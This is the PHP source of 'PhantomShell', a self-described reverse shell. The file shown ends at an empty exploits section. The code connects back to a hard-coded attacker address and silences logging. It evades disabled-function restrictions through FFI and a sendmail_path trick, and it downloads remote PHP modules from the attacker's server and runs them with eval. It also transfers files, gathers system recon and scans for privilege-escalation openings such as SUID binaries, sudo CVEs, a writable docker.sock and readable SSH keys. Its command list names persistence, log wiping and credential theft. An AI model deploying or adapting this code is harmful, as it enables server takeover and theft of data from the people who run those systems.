<?php
/*
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  PhantomShell v4.0 — Self-Adaptive PHP Reverse Shell           ║
 * ║  3 Modes: FULL / NORMAL / MINIMAL (auto-detected)              ║
 * ║  100+ commands | Pivoting | Persistence | C2-Ready              ║
 * ║  Compatible: PHP 5.6, 7.x, 8.x | Zero external deps           ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */
set_time_limit(0);@ini_set('display_errors','0');@ini_set('log_errors','0');
@ini_set('max_execution_time','0');@ini_set('memory_limit','-1');
@ini_set('output_buffering','0');error_reporting(0);ignore_user_abort(true);
if(defined('PHP_MAJOR_VERSION')&&PHP_MAJOR_VERSION==5&&PHP_MINOR_VERSION<4){
    @ini_set('safe_mode','0');@ini_set('safe_mode_exec_dir','');}

// =============================================
// 1. CONFIG
// =============================================
$CFG=array('host'=>'10.13.5.162','port'=>4444,'http_port'=>8888,
    'reconnect'=>5,'timeout'=>30,'hist_file'=>'/tmp/.ph_'.substr(md5(__FILE__),0,8),
    'hist_max'=>500,'version'=>'5.0','mode'=>'FULL','protocol'=>'auto','agent_id'=>'php-'.substr(md5(php_uname('n').getmypid()),0,8));
$G=array('sock'=>null,'history'=>array(),'hist_idx'=>0,'jobs'=>array(),'job_cnt'=>0,'caps'=>array(),
    'session_id'=>null,'proto'=>'plaintext','seq'=>0);

// =============================================
// 2. COLORS
// =============================================
define('R',"\033[0m");define('BLD',"\033[1m");define('DIM',"\033[0;90m");
define('RED',"\033[1;31m");define('GRN',"\033[1;32m");define('YEL',"\033[1;33m");
define('BLU',"\033[1;34m");define('MAG',"\033[1;35m");define('CYN',"\033[1;36m");

// =============================================
// 3. CAPABILITY AUTO-DETECTION
// =============================================
function parse_size($s){$s=trim($s);$u=strtolower(substr($s,-1));$v=(int)$s;
    switch($u){case 'g':$v*=1073741824;break;case 'm':$v*=1048576;break;case 'k':$v*=1024;break;}return $v;}

function check_capabilities(){
    global $CFG,$G;
    $c=array('memory_ok'=>true,'upload_ok'=>true,'exec_time_ok'=>true,
        'disk_write'=>true,'exec_available'=>false,'exec_method'=>'none',
        'proc_open'=>false,'network'=>true,'can_fork'=>false);
    $mem=ini_get('memory_limit');
    if($mem!==false&&$mem!==''&&$mem!=='-1'&&parse_size($mem)<33554432)$c['memory_ok']=false;
    $ul=ini_get('upload_max_filesize');
    if($ul!==false&&$ul!==''&&parse_size($ul)<524288)$c['upload_ok']=false;
    $et=(int)ini_get('max_execution_time');if($et>0&&$et<60)$c['exec_time_ok']=false;
    $c['disk_write']=(@is_writable('/tmp')||@is_writable(sys_get_temp_dir()));
    $dis=array_map('trim',explode(',',strtolower((string)ini_get('disable_functions'))));
    foreach(array('proc_open','popen','exec','shell_exec','system','passthru') as $fn){
        if(function_exists($fn)&&!in_array($fn,$dis)){if(!$c['exec_available']){$c['exec_available']=true;$c['exec_method']=$fn;}
            if($fn==='proc_open')$c['proc_open']=true;}}
    if(!$c['exec_available']&&class_exists('FFI')){$c['exec_available']=true;$c['exec_method']='FFI';}
    if(!$c['exec_available']&&function_exists('mail')&&!in_array('mail',$dis)&&function_exists('putenv')&&!in_array('putenv',$dis)){
        $c['exec_available']=true;$c['exec_method']='mail';}
    $c['can_fork']=(function_exists('pcntl_fork')&&!in_array('pcntl_fork',$dis));
    $c['network']=function_exists('fsockopen');
    $G['caps']=$c;
    if(!$c['exec_available'])$CFG['mode']='MINIMAL';
    elseif(!$c['memory_ok']||!$c['upload_ok']||!$c['exec_time_ok']||!$c['disk_write'])$CFG['mode']='NORMAL';
    else $CFG['mode']='FULL';
    return $c;
}

// =============================================
// 4. EXECUTION BYPASS ENGINE
// =============================================
function fn_off($n){static $d=null;if($d===null)$d=array_map('trim',explode(',',strtolower((string)@ini_get('disable_functions'))));return in_array(strtolower($n),$d);}

function x($cmd,&$out='',&$err='',$cwd=null){
    if(!$cwd)$cwd=getcwd();$out='';$err='';
    if(function_exists('proc_open')&&!fn_off('proc_open')){$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($cmd,$d,$pp,$cwd);if(is_resource($p)){fclose($pp[0]);$out=stream_get_contents($pp[1]);$err=stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);return proc_close($p);}}
    if(function_exists('popen')&&!fn_off('popen')){$p=@popen("cd ".escapeshellarg($cwd)." && $cmd 2>&1",'r');if($p){$out=stream_get_contents($p);return pclose($p);}}
    if(function_exists('exec')&&!fn_off('exec')){$l=array();$r=0;@exec("cd ".escapeshellarg($cwd)." && $cmd 2>&1",$l,$r);$out=implode("\n",$l);return $r;}
    if(function_exists('shell_exec')&&!fn_off('shell_exec')){$out=(string)@shell_exec("cd ".escapeshellarg($cwd)." && $cmd 2>&1");return 0;}
    if(function_exists('system')&&!fn_off('system')){ob_start();$r=0;@system("cd ".escapeshellarg($cwd)." && $cmd 2>&1",$r);$out=ob_get_clean();return $r;}
    if(function_exists('passthru')&&!fn_off('passthru')){ob_start();$r=0;@passthru("cd ".escapeshellarg($cwd)." && $cmd 2>&1",$r);$out=ob_get_clean();return $r;}
    if(class_exists('FFI')){try{$ffi=FFI::cdef("int system(const char *c);","libc.so.6");$t=tempnam('/tmp','x_');$ffi->system("cd ".escapeshellarg($cwd)." && $cmd > $t 2>&1");$out=(string)@file_get_contents($t);@unlink($t);return 0;}catch(\Throwable $e){}}
    if(function_exists('mail')&&!fn_off('mail')&&function_exists('putenv')&&!fn_off('putenv')){$t=tempnam('/tmp','x_');@putenv("X_CMD=cd ".escapeshellarg($cwd)." && $cmd > $t 2>&1");$old=@ini_get('sendmail_path');@ini_set('sendmail_path','/bin/bash -c "eval \\$X_CMD"');@mail('a','','');@ini_set('sendmail_path',$old);$out=(string)@file_get_contents($t);@unlink($t);if($out!=='')return 0;}
    $err='All execution methods blocked';return -1;
}

function xs($cmd,$sock,$cwd=null){
    if(!$cwd)$cwd=getcwd();
    if(function_exists('proc_open')&&!fn_off('proc_open')){
        $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($cmd,$d,$pp,$cwd);
        if(is_resource($p)){fclose($pp[0]);stream_set_blocking($pp[1],false);stream_set_blocking($pp[2],false);
            while(!feof($pp[1])||!feof($pp[2])){$rs=array($sock);$w=null;$e=null;
                if(@stream_select($rs,$w,$e,0,0)>0){$in=fread($sock,64);if($in!==false&&strpos($in,"\x03")!==false){$st=proc_get_status($p);if($st['running']){if(function_exists('posix_kill'))@posix_kill(-$st['pid'],9);@proc_terminate($p,9);}fclose($pp[1]);fclose($pp[2]);proc_close($p);sw($sock,"\n".RED."[!]".R." Interrupted\n");return -1;}}
                $o=@fread($pp[1],4096);if($o!==false&&$o!=='')sw($sock,$o);$e2=@fread($pp[2],4096);if($e2!==false&&$e2!=='')sw($sock,$e2);usleep(10000);}
            fclose($pp[1]);fclose($pp[2]);return proc_close($p);}}
    $o='';$e='';$r=x($cmd,$o,$e,$cwd);if($o!=='')sw($sock,$o);if($e!=='')sw($sock,$e);return $r;
}

// =============================================
// 5. SOCKET I/O
// =============================================
function sw($s,$d){$l=strlen($d);$w=0;while($w<$l){$n=@fwrite($s,substr($d,$w));if(!$n)return false;$w+=$n;}return true;}

// =============================================
// 6. SYSTEM HELPERS
// =============================================
function g_user(){static $c=null;if($c!==null)return $c;if(function_exists('posix_getpwuid')&&function_exists('posix_geteuid')){$i=posix_getpwuid(posix_geteuid());if(isset($i['name'])){$c=$i['name'];return $c;}}$o='';x('whoami',$o);$c=trim($o)?:' unknown';return $c;}
function g_uid(){static $c=null;if($c!==null)return $c;if(function_exists('posix_geteuid')){$c=posix_geteuid();return $c;}$o='';x('id -u',$o);$c=trim($o);return $c;}
function g_host(){static $c=null;if($c!==null)return $c;$h=gethostname();$c=$h?$h:'unknown';return $c;}
function g_os(){$o='';x("cat /etc/os-release 2>/dev/null|grep PRETTY_NAME|cut -d= -f2|tr -d '\"'",$o);$o=trim($o);return $o?:php_uname('s').' '.php_uname('r');}
function prompt(){global $CFG;$s=(g_uid()==0)?'#':'$';$m=($CFG['mode']!=='FULL')?DIM.'['.$CFG['mode'].']'.R:'';return $m.'['.GRN.g_user().'@'.g_host().R.':'.BLU.getcwd().R.']'.$s.' ';}

// =============================================
// 7. BANNER
// =============================================
function banner($sock){
    global $CFG,$G;$caps=$G['caps'];$mode=$CFG['mode'];
    $mc=($mode==='FULL')?GRN:(($mode==='NORMAL')?YEL:RED);
    $ip='';x("hostname -I 2>/dev/null|tr ' ' '\\n'|head -3",$ip);$ip=trim($ip)?:' unknown';
    $b="\n".MAG.str_repeat("=",64).R."\n";
    $b.=MAG."  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗".R."\n";
    $b.=MAG."  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║".R."\n";
    $b.=MAG."  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║".R."\n";
    $b.=MAG."  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║".R."\n";
    $b.=MAG."  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║".R."\n";
    $b.=MAG."  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝".R."\n";
    $proto=($G['proto']==='json')?GRN.'JSON':YEL.'PLAINTEXT';
    $b.=MAG."          SELF-ADAPTIVE PHP REVERSE SHELL v{$CFG['version']}".R."\n";
    $b.=MAG."          Protocol: ".$proto.R."\n";
    $b.=MAG.str_repeat("=",64).R."\n";
    $b.="  ".YEL."Mode".R."   : ".$mc.$mode.R."   ".YEL."Target".R." : ".GRN.str_replace("\n",", ",$ip).R."\n";
    $b.="  ".YEL."User".R."   : ".GRN.g_user().R." (uid:".g_uid().")   ".YEL."Host".R." : ".GRN.g_host().R."\n";
    $b.="  ".YEL."OS".R."     : ".GRN.g_os().R."\n";
    $b.="  ".YEL."Kernel".R." : ".GRN.php_uname('r').R."   ".YEL."PHP".R." : ".GRN.phpversion().R."\n";
    $b.="  ".YEL."Exec".R."   : ".GRN.$caps['exec_method'].R."   ".YEL."CWD".R." : ".GRN.getcwd().R."\n";
    $b.=MAG.str_repeat("-",64).R."\n";
    $b.="  Caps: ".($caps['memory_ok']?GRN."MEM+":RED."MEM-").R." ".($caps['exec_available']?GRN."EXEC+":RED."EXEC-").R." ";
    $b.=($caps['disk_write']?GRN."DISK+":RED."DISK-").R." ".($caps['proc_open']?GRN."PROC+":RED."PROC-").R." ";
    $b.=($caps['can_fork']?GRN."FORK+":RED."FORK-").R." ".($caps['network']?GRN."NET+":RED."NET-").R."\n";
    $b.=MAG.str_repeat("=",64).R."\n  Type ".YEL."help".R." for commands\n\n";
    sw($sock,$b);
}

// =============================================
// 8. HISTORY
// =============================================
function hist_load(){global $G,$CFG;if(file_exists($CFG['hist_file'])){$d=@file_get_contents($CFG['hist_file']);if($d!==false)$G['history']=array_values(array_filter(explode("\n",$d),'strlen'));}$G['hist_idx']=count($G['history']);}
function hist_save(){global $G,$CFG;@file_put_contents($CFG['hist_file'],implode("\n",$G['history'])."\n");}
function hist_add($c){global $G,$CFG;$c=trim($c);if($c===''||(!empty($G['history'])&&end($G['history'])===$c))return;$G['history'][]=$c;if(count($G['history'])>$CFG['hist_max'])$G['history']=array_slice($G['history'],-$CFG['hist_max']);$G['hist_idx']=count($G['history']);hist_save();}
function hist_prev(){global $G;if($G['hist_idx']>0){$G['hist_idx']--;return $G['history'][$G['hist_idx']];}return null;}
function hist_next(){global $G;if($G['hist_idx']<count($G['history'])-1){$G['hist_idx']++;return $G['history'][$G['hist_idx']];}$G['hist_idx']=count($G['history']);return '';}

// =============================================
// 9. TAB COMPLETION
// =============================================
function tab_complete($line,$sock){
    global $CFG;$word='';if(preg_match('/(\S+)$/',$line,$m))$word=$m[1];
    $is_first=(strpos(ltrim($line),' ')===false);$matches=array();
    $files=@glob($word.'*',GLOB_MARK);if($files)foreach($files as $f)$matches[]=$f;
    if($is_first){$bi=array('help','exit','quit','die','cd','pwd','clear','history','pty','upload','download','edit','cat','head','tail','ls','ll','la','cp','mv','rm','mkdir','chmod','chown','touch','background','fg','jobs','kill','sysinfo','env','mode','capabilities');
        if($CFG['mode']==='FULL')$bi=array_merge($bi,array('services','ports','firewall','netmap','vuln_scan','exploit_suggest','exploit_fetch','exploit_compile','privesc_check','privesc_auto','privesc_suggest','auto_root','auto_pivot','auto_persist','auto_clean','auto_report','pivot_list','pivot_portfwd','pivot_socks','pivot_tunnel','pivot_ligolo','pivot_chisel','pivot_ssh','pivot_rpivot','pivot_earthworm','pivot_proxychain','persist_all','persist_cron','persist_ssh','persist_systemd','persist_rc','persist_motd','persist_ldpreload','persist_php','persist_web','persist_wsl','clean_logs','clean_self','hide_process','hide_connection','timestomp','alter_conn','memory_only','lateral_ssh','lateral_scp','lateral_wmi','lateral_smb','steal_all','steal_configs','steal_ssh','steal_history','steal_passwords','steal_etc','steal_browsers','backdoor_php','backdoor_python','backdoor_bash','backdoor_nc','backdoor_socat','backdoor_web','c2_sliver','c2_cobalt','c2_meterpreter','c2_venom','c2_discord','c2_telegram','c2_http','portscan','connect','listen','bannergrab','exfil','compress','webshell'));
        if($CFG['mode']==='MINIMAL')$bi=array_merge($bi,array('fetch','eval_remote','loader','selfupgrade'));
        foreach($bi as $b)if($word===''||strpos($b,strtolower($word))===0)$matches[]=$b;}
    $matches=array_unique($matches);if(count($matches)===0)return array('append'=>'','redraw'=>false);
    if(count($matches)===1){$ap=substr($matches[0],strlen($word));if(!is_dir(rtrim($matches[0],'/')))$ap.=' ';return array('append'=>$ap,'redraw'=>false);}
    sw($sock,"\n");$ml=0;$disp=array();
    foreach($matches as $m2){$d=(is_file($m2)||is_dir(rtrim($m2,'/')))?basename(rtrim($m2,'/')):$m2;if(is_dir(rtrim($m2,'/')))$d.='/';$disp[]=$d;if(strlen($d)>$ml)$ml=strlen($d);}
    $cols=max(1,(int)(70/($ml+2)));foreach($disp as $i=>$d){$cl='';$fu=$matches[$i];if(is_dir(rtrim($fu,'/')))$cl=BLU;sw($sock,'  '.$cl.str_pad($d,$ml+2).R);if(($i+1)%$cols===0)sw($sock,"\n");}
    if(count($disp)%$cols!==0)sw($sock,"\n");$common=$matches[0];foreach($matches as $m2){$l=min(strlen($common),strlen($m2));$j=0;while($j<$l&&$common[$j]===$m2[$j])$j++;$common=substr($common,0,$j);}
    return array('append'=>substr($common,strlen($word)),'redraw'=>true);
}

// =============================================
// 10. MINIMAL MODE
// =============================================
function minimal_fetch($sock,$mod){global $CFG;$host=$CFG['host'];$port=$CFG['http_port'];
    sw($sock,YEL."[*]".R." Fetching '$mod' from $host:$port\n");
    $fp=@fsockopen($host,$port,$en,$es,10);if(!$fp){sw($sock,RED."[-]".R." Cannot reach $host:$port\n");return false;}
    fwrite($fp,"GET /$mod.php HTTP/1.0\r\nHost: $host\r\nConnection: close\r\n\r\n");$r='';while(!feof($fp))$r.=fread($fp,4096);fclose($fp);
    $parts=explode("\r\n\r\n",$r,2);if(count($parts)==2&&strpos($parts[0],'200')!==false&&strlen($parts[1])>10){
        $tmp=tempnam(sys_get_temp_dir(),'ph_');if(@file_put_contents($tmp,$parts[1])!==false){@include($tmp);@unlink($tmp);sw($sock,GRN."[+]".R." Loaded\n");return true;}
        $b=$parts[1];if(strpos($b,'<?php')===0)$b=substr($b,5);if(substr($b,-2)==='?>')$b=substr($b,0,-2);@eval($b);sw($sock,GRN."[+]".R." Eval'd\n");return true;}
    sw($sock,RED."[-]".R." Failed. Start: python3 -m http.server {$CFG['http_port']}\n");return false;}
function minimal_selfupgrade($sock){global $CFG;$host=$CFG['host'];$port=$CFG['http_port'];
    $fp=@fsockopen($host,$port,$en,$es,10);if(!$fp){sw($sock,RED."[-]".R." Cannot reach server\n");return;}
    fwrite($fp,"GET /phantom.php HTTP/1.0\r\nHost: $host\r\nConnection: close\r\n\r\n");$r='';while(!feof($fp))$r.=fread($fp,4096);fclose($fp);
    $parts=explode("\r\n\r\n",$r,2);if(count($parts)==2&&strpos($parts[0],'200')!==false&&strlen($parts[1])>500){
        @file_put_contents(__FILE__,$parts[1]);sw($sock,GRN."[+]".R." Upgraded. Restarting...\n");x("php ".__FILE__." &",$o);exit(0);}
    sw($sock,RED."[-]".R." Failed\n");}
function dispatch_minimal($sock,$cn,$ca){
    switch($cn){case 'exit':case 'quit':return 'exit';case 'die':return 'die';
        case 'help':sw($sock,"\n".CYN."[MINIMAL MODE]".R."\n  fetch <mod>  selfupgrade  php <expr>  read <f>  write <f> <d>\n  ls  cd  pwd  info  capabilities  mode  exit\n\n");break;
        case 'fetch':minimal_fetch($sock,trim($ca));break;case 'selfupgrade':minimal_selfupgrade($sock);break;
        case 'php':ob_start();try{$ret=@eval("return ($ca);");$o=ob_get_clean();if($o!=='')sw($sock,$o);if($ret!==null)sw($sock,print_r($ret,true)."\n");}catch(\Throwable $e){ob_get_clean();sw($sock,RED.$e->getMessage().R."\n");}break;
        case 'read':$c=@file_get_contents($ca);sw($sock,$c!==false?$c:RED."[-] Cannot read".R."\n");break;
        case 'write':$p=preg_split('/\s+/',$ca,2);if(count($p)<2)sw($sock,RED."Usage: write <f> <data>".R."\n");else sw($sock,@file_put_contents($p[0],$p[1])!==false?GRN."[+]".R."\n":RED."[-]".R."\n");break;
        case 'ls':$d=$ca?:'.';$ent=@scandir($d);if(!$ent){sw($sock,RED."[-]".R."\n");break;}foreach($ent as $e){if($e[0]==='.')continue;sw($sock,(is_dir(rtrim($d,'/').'/'.$e)?BLU:'').$e.R.'  ');}sw($sock,"\n");break;
        case 'cd':@chdir($ca?:'/');sw($sock,getcwd()."\n");break;case 'pwd':sw($sock,getcwd()."\n");break;
        case 'info':ob_start();@phpinfo(INFO_GENERAL|INFO_CONFIGURATION);sw($sock,substr(strip_tags(ob_get_clean()),0,3000)."\n");break;
        case 'mode':sw($sock,RED."MINIMAL".R."\n");break;case 'capabilities':cmd_capabilities($sock);break;
        case 'clear':sw($sock,"\033[2J\033[H");break;
        default:sw($sock,RED."[-]".R." Unknown. Type help\n");break;}return 'ok';}

// =============================================
// 11. FILE OPERATIONS (NORMAL+FULL)
// =============================================
function cmd_upload($sock,$fn){if(!$fn)$fn='upload_'.time();sw($sock,YEL."[*]".R." Send base64, end with --EOF--\n");stream_set_blocking($sock,true);stream_set_timeout($sock,120);$b='';$bytes=0;while(true){$l=fgets($sock,8192);if($l===false||trim($l)==='--EOF--')break;$b.=$l;$bytes+=strlen($l);if($bytes%65536<strlen($l))sw($sock,DIM."[*] ".round($bytes/1024,1)."KB".R."\r");}stream_set_blocking($sock,false);$d=@base64_decode(preg_replace('/\s+/','',$b),true);if($d===false){sw($sock,RED."[-] Bad base64".R."\n");return;}if(@file_put_contents($fn,$d)===false){sw($sock,RED."[-] Write fail".R."\n");return;}@chmod($fn,0755);sw($sock,GRN."[+]".R." $fn (".strlen($d)."B MD5:".md5($d).")\n");}
function cmd_download($sock,$f){if(!$f){sw($sock,RED."[-] Usage: download <f>".R."\n");return;}if(!is_readable($f)){sw($sock,RED."[-] Cannot read".R."\n");return;}$d=@file_get_contents($f);if($d===false){sw($sock,RED."[-]".R."\n");return;}sw($sock,GRN."[+]".R." $f (".strlen($d)."B MD5:".md5($d).")\n--BEGIN-B64--\n");foreach(str_split(base64_encode($d),76) as $c)sw($sock,$c."\n");sw($sock,"--END-B64--\n");}
function cmd_edit($sock,$fp){if(!$fp){sw($sock,RED."Usage: edit <f>".R."\n");return;}$lines=array();if(file_exists($fp)){$c=@file_get_contents($fp);if($c!==false)$lines=explode("\n",$c);}sw($sock,CYN."[Editor]".R." i<n><text> a<text> d<n> r<n><text> p w wq q\n");stream_set_blocking($sock,true);stream_set_timeout($sock,300);while(true){sw($sock,YEL."ed>".R." ");$in=trim(fgets($sock,4096),"\r\n");if($in==='q')break;if($in==='wq'){@file_put_contents($fp,implode("\n",$lines));sw($sock,GRN."Saved".R."\n");break;}if($in==='w'){sw($sock,@file_put_contents($fp,implode("\n",$lines))!==false?GRN."Saved".R."\n":RED."Fail".R."\n");continue;}if($in==='p'){foreach($lines as $i=>$v)sw($sock,sprintf(DIM."%4d".R." %s\n",$i+1,$v));continue;}if(preg_match('/^i\s+(\d+)\s(.*)$/',$in,$m)){array_splice($lines,max(0,(int)$m[1]-1),0,array($m[2]));continue;}if(preg_match('/^a\s(.*)$/',$in,$m)){$lines[]=$m[1];continue;}if(preg_match('/^d\s+(\d+)$/',$in,$m)){$n=(int)$m[1]-1;if(isset($lines[$n]))array_splice($lines,$n,1);continue;}if(preg_match('/^r\s+(\d+)\s(.*)$/',$in,$m)){$n=(int)$m[1]-1;if(isset($lines[$n]))$lines[$n]=$m[2];continue;}}stream_set_blocking($sock,false);}
function cmd_cat($s,$a){if(!$a){sw($s,RED."Usage: cat <f>".R."\n");return;}$d=@file_get_contents($a);if($d===false){sw($s,RED."[-]".R."\n");return;}sw($s,$d);if($d!==''&&substr($d,-1)!=="\n")sw($s,"\n");}
function cmd_head($s,$a){$p=preg_split('/\s+/',trim($a),2);$f=$p[0];$n=isset($p[1])?(int)$p[1]:10;$fh=@fopen($f,'r');if(!$fh){sw($s,RED."[-]".R."\n");return;}$i=0;while($i<$n&&($l=fgets($fh))!==false){sw($s,$l);$i++;}fclose($fh);}
function cmd_tail($s,$a){$p=preg_split('/\s+/',trim($a),2);$f=$p[0];$n=isset($p[1])?(int)$p[1]:10;$all=@file($f);if(!$all){sw($s,RED."[-]".R."\n");return;}foreach(array_slice($all,-$n) as $l)sw($s,$l);}
function cmd_ls($s,$a){$o='';x('ls --color=always '.($a?$a:'').' 2>&1',$o);sw($s,$o?$o."\n":"");}

// =============================================
// 12. SYSTEM RECON
// =============================================
function cmd_sysinfo($s){$chks=array('Hostname'=>'hostname -f 2>/dev/null||hostname','Kernel'=>'uname -a','OS'=>'cat /etc/os-release 2>/dev/null|head -5','CPU'=>'lscpu 2>/dev/null|head -8','Memory'=>'free -h 2>/dev/null','Disk'=>'df -h 2>/dev/null|head -8','Users'=>'id && who 2>/dev/null','Interfaces'=>'ip -4 addr show 2>/dev/null||ifconfig 2>/dev/null','DNS'=>'cat /etc/resolv.conf 2>/dev/null|grep nameserver','Routes'=>'ip route 2>/dev/null','Listening'=>'ss -tlnp 2>/dev/null||netstat -tlnp 2>/dev/null','Processes'=>'ps aux --sort=-%mem 2>/dev/null|head -15','SUID'=>'find / -perm -4000 -type f 2>/dev/null|head -20');sw($s,"\n".CYN."[System Info]".R."\n");foreach($chks as $l=>$c){$o='';x($c,$o);$o=trim($o);if($o!=='')sw($s,"\n".YEL."[$l]".R."\n$o\n");}sw($s,"\n");}
function cmd_env($s){$o='';x('env 2>/dev/null',$o);sw($s,$o?:"-\n");}
function cmd_services($s){$o='';x('systemctl list-units --type=service --state=running 2>/dev/null||service --status-all 2>/dev/null||ls /etc/init.d/ 2>/dev/null',$o);sw($s,$o."\n");}
function cmd_ports($s){$o='';x('ss -tlnp 2>/dev/null||netstat -tlnp 2>/dev/null',$o);sw($s,$o."\n");}
function cmd_firewall($s){$o='';x('iptables -L -n -v 2>&1',$o);sw($s,YEL."[iptables]".R."\n$o\n");$o='';x('nft list ruleset 2>&1',$o);sw($s,YEL."[nftables]".R."\n$o\n");}
function cmd_netmap($s){sw($s,CYN."[Network Map]".R."\n");$o='';x('ip -4 addr show 2>/dev/null||ifconfig 2>/dev/null',$o);sw($s,YEL."[Interfaces]".R."\n$o\n");$o='';x('ip route 2>/dev/null||route -n 2>/dev/null',$o);sw($s,YEL."[Routes]".R."\n$o\n");$o='';x('arp -a 2>/dev/null||ip neigh 2>/dev/null',$o);sw($s,YEL."[ARP]".R."\n$o\n");$o='';x('cat /etc/hosts 2>/dev/null',$o);sw($s,YEL."[Hosts]".R."\n$o\n");}
function cmd_capabilities($s){global $G;sw($s,"\n".CYN."[Capabilities]".R."\n");foreach($G['caps'] as $k=>$v)sw($s,"  ".YEL.str_pad($k,16).R." ".(is_bool($v)?($v?GRN.'true':RED.'false'):GRN.$v).R."\n");sw($s,"\n");}

// =============================================
// 13. VULN SCANNER
// =============================================
function cmd_vuln_scan($s){
    sw($s,"\n".CYN."  VULNERABILITY SCANNER".R."\n".str_repeat("=",50)."\n");$found=0;
    $kv=array(0,0,0);if(preg_match('/^(\d+)\.(\d+)\.(\d+)/',php_uname('r'),$m))$kv=array((int)$m[1],(int)$m[2],(int)$m[3]);
    sw($s,YEL."[Kernel]".R."\n");
    $ke=array(array('DirtyCow','CVE-2016-5195',function($k){return($k[0]<4)||($k[0]==4&&$k[1]<8);}),array('OverlayFS','CVE-2021-3493',function($k){return($k[0]==4&&$k[1]>=4)||($k[0]==5&&$k[1]<=11);}),array('DirtyPipe','CVE-2022-0847',function($k){return($k[0]==5&&$k[1]>=8)&&!($k[0]==5&&$k[1]==16&&$k[2]>=11);}),array('GameOver','CVE-2023-2640',function($k){return($k[0]==5&&$k[1]==15)||($k[0]==6&&$k[1]<=2);}),array('nf_tables','CVE-2024-1086',function($k){return($k[0]==5&&$k[1]>=14)||($k[0]==6&&$k[1]<=6);}),array('Netfilter','CVE-2023-32233',function($k){return($k[0]==5&&$k[1]>=1)||($k[0]==6&&$k[1]<=4);}));
    foreach($ke as $e){$fn=$e[2];if($fn($kv)){sw($s,"  ".RED."[!] {$e[0]} ({$e[1]})".R."\n");$found++;}}
    if(!$found)sw($s,"  ".GRN."[+] None".R."\n");
    sw($s,"\n".YEL."[SUID]".R."\n");$o='';x('find / -perm -4000 -type f 2>/dev/null',$o);
    $gtfo=array('find','python','python3','perl','bash','cp','nmap','vim','vi','less','more','pkexec','env','awk','tar','zip','docker','node','php','ruby','gdb','screen','socat','base64');
    foreach(array_filter(explode("\n",trim($o))) as $f){$bn=strtolower(basename($f));foreach($gtfo as $g)if($bn===$g){sw($s,"  ".RED."[!] $f (GTFOBins)".R."\n");$found++;break;}}
    sw($s,"\n".YEL."[Sudo]".R."\n");$o='';x('sudo -V 2>/dev/null|head -1',$o);
    if(preg_match('/(\d+\.\d+[\.\d]*)/',trim($o),$m)){$v=$m[1];if(version_compare($v,'1.8.28','<')){sw($s,"  ".RED."[!] CVE-2019-14287".R."\n");$found++;}if(version_compare($v,'1.9.5','<')&&version_compare($v,'1.9.0','>=')){sw($s,"  ".RED."[!] CVE-2021-3156".R."\n");$found++;}}
    $o='';x('sudo -n -l 2>&1',$o);if(strpos($o,'NOPASSWD')!==false){sw($s,"  ".RED."[!] Sudo:".R."\n$o\n");$found++;}
    sw($s,"\n".YEL."[Docker]".R."\n");
    if(file_exists('/var/run/docker.sock')&&is_writable('/var/run/docker.sock')){sw($s,"  ".RED."[!] Socket writable!".R."\n");$found++;}
    $o='';x('id -nG 2>/dev/null',$o);if(strpos($o,'docker')!==false){sw($s,"  ".RED."[!] Docker group!".R."\n");$found++;}
    sw($s,"\n".YEL."[Polkit]".R."\n");$o='';x('pkexec --version 2>/dev/null',$o);if(trim($o)!==''){sw($s,"  ".RED."[!] pkexec found — PwnKit".R."\n");$found++;}
    sw($s,"\n".YEL."[Cron]".R."\n");$o='';x('find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null',$o);if(trim($o)!==''){sw($s,"  ".RED."[!]".R."\n$o\n");$found++;}
    sw($s,"\n".YEL."[Caps]".R."\n");$o='';x('getcap -r / 2>/dev/null|head -15',$o);if(trim($o)!==''){sw($s,"$o\n");foreach(array('cap_setuid','cap_sys_admin','cap_dac_override') as $dc)if(stripos($o,$dc)!==false){sw($s,"  ".RED."[!] $dc".R."\n");$found++;}}
    sw($s,"\n".YEL."[/etc]".R."\n");if(is_writable('/etc/passwd')){sw($s,"  ".RED."[!] /etc/passwd WRITABLE".R."\n");$found++;}if(is_readable('/etc/shadow')){sw($s,"  ".RED."[!] /etc/shadow READABLE".R."\n");$found++;}
    sw($s,"\n".YEL."[SSH]".R."\n");$o='';x('find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null',$o);if(trim($o)!==''){sw($s,"  ".RED."[!]".R."\n$o\n");$found++;}
    sw($s,"\n".YEL."[Configs]".R."\n");$o='';x('find / -maxdepth 5 \( -name ".env" -o -name "wp-config.php" -o -name "config.php" \) -type f 2>/dev/null|head -15',$o);if(trim($o)!==''){sw($s,"  ".RED."[!]".R."\n$o\n");$found++;}
    sw($s,"\n".str_repeat("=",50)."\n  ".($found>0?RED.$found:GRN."0")." vulnerabilities found".R."\n\n");
}

// =============================================
// 14. EXPLOITS
// =============================================
